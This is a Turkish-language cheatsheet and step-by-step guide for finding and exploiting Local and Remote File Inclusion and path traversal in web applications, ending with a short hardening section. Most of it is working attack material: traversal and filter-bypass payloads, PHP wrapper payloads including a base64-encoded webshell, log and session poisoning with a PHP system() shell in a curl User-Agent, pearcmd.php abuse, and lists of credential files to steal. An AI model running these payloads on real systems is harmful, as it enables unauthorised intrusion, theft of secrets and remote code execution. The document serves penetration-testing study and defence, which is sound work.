# ⚡ LFI (Local File Inclusion), RFI & Path Traversal — Adım Adım Teknik Rehber ve Cheatsheet

Bu doküman, saha notları, TryHackMe / PortSwigger laboratuvar tecrübeleri ve kod inceleme (code review) tuzaklarının birleştirildiği **tek başvuru rehberidir**. Hem teorik mantığı hem de bir hedefi incelerken **"Adım 1'den Adım 6'ya kadar tam olarak ne yapacağım?"** sorusunun cevabını içerir.

![LFI ve Path Traversal Adım Adım Arama Akış Şeması](../assets/lfi_hunting_workflow.png)

---

## 1. Temel Mantık: Path Traversal vs LFI vs RFI

| Kavram | Sunucu Fonksiyonu | Ne Olur? | Etki Seviyesi |
| :--- | :--- | :--- | :--- |
| **Path Traversal** | `file_get_contents()`, `readfile()`, `fopen()` | Dosyayı sadece **okur** ve ham metin olarak döndürür; içindeki PHP kodunu çalıştırmaz. *(İstisna: `phar://` Deserialization & `CVE-2024-2961`!)* | Bilgi İfşası (`/etc/passwd`, `.env`, SSH key) |
| **LFI (Local File Inclusion)** | `include()`, `require()`, `include_once()`, `require_once()` | Yerel dosyayı açar ve içindeki `<?php ... ?>` kodunu **çalıştırır**. | Bilgi İfşası **+ RCE** (Poisoning / Wrapper) |
| **RFI (Remote File Inclusion)** | `include()` + `allow_url_include = On` | Dış sunucudan (`http://attacker/shell.txt`) dosya çekip çalıştırır. Modern PHP'de varsayılan **Off**. | Doğrudan **RCE** |

### Zafiyetli Örnek (PHP) ve Diğer Diller
```php
if (isset($_GET['page'])) {
    $page = $_GET['page']; // Doğrulama yok!
    include($page);        // /etc/passwd veya zehirli log dosyasını açıp çalıştırır
}
```
* **Python:** `open()`, `os.path.join()`, `send_file()`
* **Node.js:** `fs.readFile()`, `res.sendFile()`, `path.join()`
* **Java:** `new File()`, `FileInputStream()`, `RequestDispatcher.include()`
* **Go:** `os.ReadFile()`, `http.ServeFile()`

### LFI Türleri
1. **Basic / Unrestricted:** Önek veya sonek yok (`?page=/etc/passwd`).
2. **Prefix'li LFI:** Başa klasör ekler (`include("languages/" . $_GET['lang'])`). `../` ile dışarı çıkmak gerekir.
3. **Suffix'li LFI:** Sona `.php` ekler (`include($_GET['page'] . ".php")`). `php://filter`, `zip://`, `phar://` veya eski PHP'de `%00` gerekir.
4. **Filtered / Blacklist:** `../` temizlenir (`str_replace`), karakter filtresi vardır.
5. **Blind LFI:** Hata veya dosya çıktısı görünmez; HTTP durum kodu (`200` vs `500`), yanıt boyutu (`ffuf -fs`) veya zaman farkı ile anlaşılır.

---

## 2. Ararken Adım Adım Ne Yapacaksın? (Hunting Playbook)

### Adım 1: Giriş Noktalarını & Açık `.git` Dizinini Yakala
Başka bir dosyayı, şablonu, dili veya resmi yükleyen her parametre şüphelidir:
* **Top 25 GET/POST Parametresi:** `?cat=`, `?dir=`, `?action=`, `?board=`, `?date=`, `?detail=`, `?file=`, `?download=`, `?path=`, `?folder=`, `?prefix=`, `?include=`, `?page=`, `?inc=`, `?locate=`, `?show=`, `?doc=`, `?site=`, `?type=`, `?view=`, `?content=`, `?document=`, `?layout=`, `?mod=`, `?conf=`
* **Cookie & HTTP Header:** `language=en`, `theme=dark`, `User-Agent`, `Referer`, `X-Forwarded-For`
* **Exposed `.git` Kontrolü:** Kaynak kodu komple çekebilirsen LFI aramana bile gerek kalmaz:
  ```bash
  curl -s -i http://TARGET/.git/HEAD
  uv tool install git-dumper
  git-dumper http://TARGET/.git/ out/ && cd out && git checkout .
  ```

### Adım 2: Hata Mesajı & Parmak İzi Alma (`?page=test_123`)
İlk payload olarak hemen `/etc/passwd` atmak yerine **var olmayan bir dosya** gönder:
```text
Warning: include(languages/test_123.php): failed to open stream: No such file or directory in /var/www/html/app/index.php on line 12
```
Bu tek hatadan **4 altın bilgi** çıkar:
1. **Prefix:** `languages/` → Başta sabit klasör var (`../` şart).
2. **Suffix:** `.php` → Sona otomatik uzantı ekleniyor (`php://filter` içinde uzantısız `resource=config` yaz).
3. **Webroot Derinliği:** `/var/www/html/app/` → En az 4 seviye `../` gerekir. *(Emin değilsen 8–10 adet `../` kullan; `/` üstüne çıkılamadığı için zarar vermez.)*
4. **İşletim Sistemi:** `/` ise Linux, `\` veya `C:\` ise Windows.

### Adım 3: `curl --path-as-is` Kuralı ve Dizin Kanıtlama
> **Kritik Tuzak:** Tarayıcılar ve standart `curl`, URL içindeki `../` dizilerini sunucuya göndermeden kendi içinde sadeleştirir! Ayrıca `/proc/self/environ` gibi boyutu `0` görünen sanal dosyalar için `--ignore-content-length` eklenmelidir.
```bash
curl --path-as-is -b "session=$SESSION" \
  "http://TARGET/admin/get_system_log?log_identifier=../../../../proc/self/environ" \
  --ignore-content-length -s | tr '\000' '\n'
```
* **Klasör Varlığını Kanıtlama:** `../../../etc/passwd` çalışıyorsa şüpheli klasörü başa yazıp `../` sayısını 1 artır: `?page=private/../../../../etc/passwd` → çalışırsa `private/` klasörü kesin vardır.

### Adım 4: Otomatik Tarama (`lfi_hunter.py` ve `ffuf`)
```bash
# Bu depodaki otomatik LFI denetçisi (--path-as-is + Top-25 parametre + rapor)
python3 tool/lfi_hunter.py --url "http://TARGET/view?page=home" --report audit_report.md

# ffuf ile wordlist taraması (-fs ile hata sayfasının boyutunu mutlaka ele!)
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://TARGET/?page=FUZZ" -fs <HATA_BOYUTU>
```

---

## 3. Filtre Bypass Matrisi ve Dil Bazlı Tuzaklar

### A. Klasik Bypass Payload'ları
| Karşılaşılan Engel | Örnek Payload | Mantığı |
| :--- | :--- | :--- |
| **Hiçbir Filtre Yok** | `../../../../../../../../etc/passwd` | Doğrudan kök dizine çıkar. |
| **`../` Engelli (Mutlak Yol Açık)** | `/etc/passwd` | Doğrudan mutlak yol verilir. |
| **Non-Recursive Strip (`str_replace`)** | `....//....//....//etc/passwd` · `..././` | Ortadaki `../` silinince kenarlar birleşip yeniden `../` oluşur. |
| **URL / Double URL Encode** | `%2e%2e%2f` · `..%252f..%252f..%252fetc%252fpasswd` | WAF/Framework 1. decode'u yapar, backend 2. decode ile `../` görür. |
| **Overlong UTF-8 / Backslash** | `..%c0%af` · `/%5c..%5c../etc/passwd` | Standart `/` filtresini atlatır. |
| **Zorunlu Başlangıç Klasörü** | `languages/../../../../../etc/passwd` | Prefix kontrolünü geçip geri çıkar. |
| **Null Byte / Path Truncation** | `../../../etc/passwd%00` · `a/../../../etc/passwd/./.[2027+]` | Eski PHP (`< 5.4` / `< 5.3`) sürümlerinde `.php` ekini düşürür. |
| **PHP `assert()` Enjeksiyonu** | `' and die(system("id")) or '` | `assert("strpos('$file','..')===false")` içinde tırnaktan kaçıp RCE alır. |

### B. Dil & Kütüphane Tuzakları (Code Review)
| Teknoloji / Kütüphane | Hata / Zafiyetli Davranış | Örnek / Doğrusu |
| :--- | :--- | :--- |
| **Go (`path.Clean`)** | Sadece `/` (URL) içindir, Windows `\` ve sürücü harfini anlamaz. `safe\..\..\Windows\win.ini` geçer! | **Doğrusu:** `path/filepath` + `filepath.IsLocal()` + `filepath.Rel(base, target)` (symlink'lere dikkat!). |
| **Python (`os.path.join`)** | 2. argüman `/` ile başlarsa (`?file=/etc/passwd`) önceki `BASE_DIR`'i tamamen çöpe atar! | **Doğrusu:** `os.path.realpath()` sonrası `commonpath` / prefix kontrolü. |
| **Java / Tomcat / Spring** | Path parametresi (`;`) normalizasyonu atlatır; klasör verilirse dizin listesi dönebilir. | `..;/..;/..;/etc/passwd` |
| **Nginx (Off-by-Slash)** | `location /static` bloğu `/` ile bitmiyorsa (`alias /var/www/static/;`) | `http://TARGET/static../etc/passwd` |
| **TCPDF (`<= 6.8.2`)** | `startSVGElementHandler()` `../` kontrolünü `urldecode()`'dan **önce** yapar (`6.9.1`'de düzeltildi). | `<img src="%2f..%252f..%252ftmp%252fsecret.png" />` |

---

## 4. PHP Wrappers & Okuma / RCE Teknikleri

| Wrapper | Örnek Kullanım | Ne İşe Yarar? |
| :--- | :--- | :--- |
| **`php://filter` (Base64)** | `PhP://filter/convert.base64-encode/resource=index.php` | PHP kodunu çalıştırmadan Base64 olarak okur (`PhP://` case-insensitive). |
| **`data://`** | `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=+.txt` | `allow_url_include=On` ise direkt RCE (`+.txt` uzantı filtresini aşar). |
| **`php://input`** | `POST ?p=php://input` (Body: `<?php system('id'); ?>`) | POST gövdesini PHP olarak çalıştırır. |
| **`zip://` / `rar://`** | `zip://uploads/shell.jpg%23payload` | Upload + LFI birleşiminde `.jpg` içindeki PHP'yi çalıştırır (`%23` = `#`). |
| **`phar://`** | `phar://uploads/evil.jpg/test.txt` | **`include()` olmasa bile** `file_exists()`, `fopen()`, `filesize()` üzerinden **Deserialization RCE** tetikler! |
| **`php://fd` & `expect://`** | `php://fd/3` · `expect://id` | Açık file descriptor okuma / aktifse OS komutu. |

### İleri Seviye: Blind PHP Filter Chain & `CVE-2024-2961`
* **Blind Error Oracle:** Çıktı ekrana basılmıyorsa `UCS-4LE` + `dechunk` + `convert.iconv.UNICODE.CP930` zinciriyle 500 hatası üzerinden dosya karakter karakter okunur (`php_filters_chain_oracle_exploit`).
* **Dosyasız RCE (PHP Filter Chains):** `allow_url_include=Off` ve yazılabilir log/session yoksa `convert.iconv.*` zincirleriyle (`synacktiv/php_filter_chain_generator`) bellek içinde PHP payload üretilip `include()` ile RCE alınabilir.
* **`CVE-2024-2961`:** PHP `glibc iconv` içindeki 3-byte heap overflow sayesinde `php://filter` destekleyen *Arbitrary Read* açığını tam RCE'ye çevirir.

---

## 5. LFI2RCE: Kritik Dosyalar & Zehirleme (Poisoning)

### Okunacak Kritik Hedefler
* **Linux:** `/etc/passwd`, `/home/<user>/.ssh/id_rsa`, `/var/www/html/.env`, `config.php`, `wp-config.php`, `/root/.bash_history`, `/proc/self/environ`, `/proc/self/fd/0..30`, `/proc/version`
* **Windows:** `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`, `C:\xampp\apache\logs\access.log`

### Zehirleme (Poisoning) & Race Condition Vektörleri
| Vektör | Hedef Yol | Nasıl Zehirlenir / Tetiklenir? |
| :--- | :--- | :--- |
| **Apache / Nginx Log** | `/var/log/apache2/access.log` · `/var/log/nginx/access.log` | `curl -s -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/` (**Çift tırnak `"` ve tarayıcı adres çubuğu KULLANMA**, escape/encode eder!). Sonra `?page=../../../../var/log/apache2/access.log&cmd=id` |
| **Access Log Token Replay** | `access.log` | URL'de taşınan `?AuthenticationToken=`, `?sid=`, `?token=` değerlerini logdan okuyup oturum çal. |
| **`/proc/self/environ`** | `../../../proc/self/environ` | `User-Agent: <?=phpinfo(); ?>` gönderip environ dosyasını include et. |
| **PHP Sessions** | `/var/lib/php/sessions/sess_<ID>` · `/tmp/sess_<ID>` | Session'a yazılan alana `<?php system($_GET['cmd']); ?>` gönder, ardından kendi `PHPSESSID` dosyanı include et. |
| **SSH / vsftpd / Mail** | `/var/log/auth.log` · `/var/log/vsftpd.log` · `/var/mail/<USER>` | SSH kullanıcı adına veya maile PHP payload basıp include et. |
| **Docker `pearcmd.php`** | `/usr/local/lib/php/pearcmd.php` | `?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php` |
| **Temp File Race** | `/tmp/sess_*` · `/tmp/php*` | `PHP_SESSION_UPLOAD_PROGRESS`, Nginx temp body veya `phpinfo()` + upload yarışı. |

### Arbitrary File Write & Delete
* **Arbitrary File Write:** ZIP/XML/JSON yükleyicilerde `../` ile webroot'a shell bırak (`/var/www/html/shell.php`, `../../../webapps/ROOT/shell.jsp`).
* **Arbitrary File Delete (`unlink()`):** `wp-config.php` veya `data/install.lock` silinirse kurulum sihirbazı yeniden açılır (yeni admin + RCE!); `.htaccess` silinirse erişim kısıtları kalkar.

---

## 6. Güvenli Kodlama (Remediation & Hardening)

| Katman | Yöntem | Uygulama |
| :---: | :--- | :--- |
| **0. Katman (En İyi)** | **Zero Filesystem Exposure** | Kullanıcıdan dosya adı alma; `?id=1` gibi sayısal ID al ve sunucu tarafındaki sabit haritadan yolu çek. |
| **1. Katman** | **Strict Allowlist** | Yalnızca önceden tanımlı sabit değerleri (`in_array($page, $allowed, true)`) kabul et. |
| **2. Katman** | **Canonicalization + Containment** | Önce `realpath()` / `filepath.EvalSymlinks()` ile `../` ve symlink'leri çöz, **sonra** izin verilen taban dizin (`BASE_DIR/`) altında olduğunu doğrula. (`str_replace("../", "")`, `path.Clean()`, `getAbsolutePath()` veya düz `startsWith("uploads/")` kullanma!) |
| **Sistem Sertleştirme** | **PHP / Sunucu Ayarları** | `allow_url_include = Off`, `open_basedir` kısıtı, `/.git/` erişim engeli ve hassas token'ların GET URL'de taşınmaması. |
